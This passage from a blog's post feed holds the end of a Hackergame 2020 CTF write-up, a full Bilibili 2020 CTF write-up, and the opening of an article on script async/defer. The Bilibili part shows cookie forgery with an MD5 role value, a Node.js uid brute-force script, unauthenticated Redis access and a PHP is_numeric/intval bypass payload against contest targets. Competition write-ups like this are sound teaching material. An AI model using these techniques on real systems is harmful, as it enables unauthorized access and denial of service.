帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"flag1\"</span>);            input.<span class=\"hljs-property\">value</span> = <span class=\"hljs-title class_\">String</span>(data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"flag2: \"</span> + data.<span class=\"hljs-property\">data</span>);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.<span class=\"hljs-title function_\">ajax</span>({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);        <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.<span class=\"hljs-property\">data</span> + <span class=\"hljs-string\">\" }}\"</span>.<span class=\"hljs-title function_\">toLowerCase</span>() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {    (<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) {        $.getUrlParam = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) {            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">location</span>.<span class=\"hljs-property\">search</span>.<span class=\"hljs-title function_\">substr</span>(<span class=\"hljs-number\">1</span>).<span class=\"hljs-title function_\">match</span>(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.<span class=\"hljs-title function_\">getUrlParam</span>(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.<span class=\"hljs-title function_\">ajax</span>({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) {            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);            <span class=\"hljs-keyword\">if</span> (data.<span class=\"hljs-property\">code</span> == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.<span class=\"hljs-property\">data</span>)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).<span class=\"hljs-title function_\">html</span>(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">get</span>(<span class=\"hljs-params\">hostname, path</span>) {  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.<span class=\"hljs-title function_\">request</span>(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.<span class=\"hljs-title function_\">push</span>(chunk); });        res.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            <span class=\"hljs-title function_\">resolve</span>(<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">concat</span>(body).<span class=\"hljs-title function_\">toString</span>());          } <span class=\"hljs-keyword\">catch</span> (e) {            <span class=\"hljs-title function_\">reject</span>(e);          }        });        req.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { <span class=\"hljs-title function_\">reject</span>(err); });      }    );    req.<span class=\"hljs-title function_\">setHeader</span>(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.<span class=\"hljs-title function_\">end</span>();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">get</span>(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">parse</span>(res).<span class=\"hljs-property\">code</span> === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-title function_ invoke__\">print_r</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div>Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-25</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> = <span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">dataLayer</span> || [];</span><span class=\"language-javascript\">  <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-params\"></span>){dataLayer.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">arguments</span>);}</span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Date</span>());</span><span class=\"language-javascript\"></span><span class=\"language-javascript\">  <span class=\"hljs-title function_\">gtag</span>(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 